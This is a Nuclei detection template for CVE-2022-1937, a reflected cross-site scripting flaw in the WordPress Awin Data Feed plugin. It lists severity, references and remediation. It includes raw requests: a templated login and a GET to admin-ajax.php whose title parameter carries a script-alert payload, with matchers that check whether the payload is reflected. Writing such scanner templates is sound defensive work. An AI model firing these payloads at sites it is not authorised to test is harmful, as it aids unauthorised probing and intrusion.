id: CVE-2022-1937

info:
  name: WordPress Awin Data Feed <=1.6 - Cross-Site Scripting
  author: Akincibor,DhiyaneshDK
  severity: medium
  description: |
    WordPress Awin Data Feed plugin 1.6 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action, available to both unauthenticated and authenticated users.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the affected website, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Update to the latest version of the WordPress Awin Data Feed plugin (1.6 or higher) to mitigate this vulnerability.
  reference:
    - https://wpscan.com/vulnerability/eb40ea5d-a463-4947-9a40-d55911ff50e9
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1937
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-1937
    cwe-id: CWE-79
    epss-score: 0.03501
    epss-percentile: 0.87146
    cpe: cpe:2.3:a:awin:awin_data_feed:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: awin
    product: awin_data_feed
    framework: wordpress
  tags: cve,cve2022,xss,awin,wpscan,wp-plugin,wp,wordpress,authenticated

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/admin-ajax.php?action=get_sw_product&title=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(header_2, "text/html")'
          - 'status_code_2 == 200'
          - contains(body_2, 'colspan=\"2\"><script>alert(document.domain)</script></th>')
        condition: and
# digest: 490a004630440220498d7350640e4384344267dc91bf45067512913e0be2b1cbc81dcd8e095edf5102202e6ef255ffcf8c73dc4b7e54eeb52dfb0fbc735dd6ce9068221aa4b4edc25842:922c64590222798bb761d5b6d8e72950